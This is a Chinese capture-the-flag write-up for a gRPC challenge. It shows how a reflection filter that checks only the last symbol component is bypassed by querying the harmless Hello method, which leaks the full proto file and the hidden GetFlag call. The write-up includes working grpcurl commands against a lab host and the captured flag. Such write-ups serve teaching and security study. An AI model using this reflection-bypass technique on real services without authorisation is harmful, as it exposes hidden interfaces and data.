# Sgrpc

## 题目简述

题目运行一个 gRPC 服务，并注册了受限的 server reflection。反射端点只接受 `file_containing_symbol` 请求，且禁止查询最后一个符号分量中包含 `flag` 的名称。服务仍公开 `flag.Flag.Hello` 方法；请求这个无敏感名字的方法时，反射实现会返回其整个父级 proto 文件，从而连带泄露 `GetFlag`、请求字段编号、类型和默认值。

## 解题过程

过滤函数只检查查询字符串最后一个点号后的部分：

```go
func isDisallowedMessage(symbol string) bool {
    parts := strings.Split(symbol, ".")
    return strings.Contains(strings.ToLower(parts[len(parts)-1]), "flag")
}
```

因此 `flag.Flag.GetFlag` 会被拒绝，而 `flag.Flag.Hello` 可以通过。反射服务器找到 `Hello` 描述符后调用 `d.ParentFile()`，返回的是包含两个 RPC 的完整 `flag.proto`，其中可见：

```protobuf
service Flag {
  rpc GetFlag(FlagRequest) returns (FlagReply);
  rpc Hello(google.protobuf.Empty) returns (HelloReply);
}

message FlagRequest {
  required string first_condition = 2 [default = "TraLaLeRo TraLaLa"];
  required bytes second_condition = 3 [default = "cafebabe"];
  required fixed64 last_condition = 1 [default = 3141592654];
}
```

用 `grpcurl` 请求允许的符号并导出 proto，再调用泄露出的 RPC：

```bash
grpcurl -plaintext -proto-out-dir . \
  target.example:3335 describe flag.Flag.Hello

grpcurl -plaintext -proto flag.proto -format json \
  -d '{"first_condition":"TraLaLeRo TraLaLa","second_condition":"Y2FmZWJhYmU=","last_condition":3141592654}' \
  target.example:3335 flag.Flag.GetFlag
```

`second_condition` 的 proto 类型是 `bytes`，JSON 表示必须使用 Base64；`Y2FmZWJhYmU=` 解码为 ASCII `cafebabe`。三个条件全部匹配后，响应为：

```text
grey{r3fl3ct_th3_sch3m4}
```

## 方法总结

- 核心技巧：查询同一 proto 文件中的非敏感符号，借父文件级反射结果旁路符号名黑名单。
- 识别信号：反射权限按单个符号名判断、实际返回单位却是整个文件描述符时，文件内相邻服务或方法会形成信息泄露。
- 复用要点：从描述符恢复调用时要保留字段编号、proto2 required/default 语义以及 `bytes` 在 JSON 中的 Base64 表示。
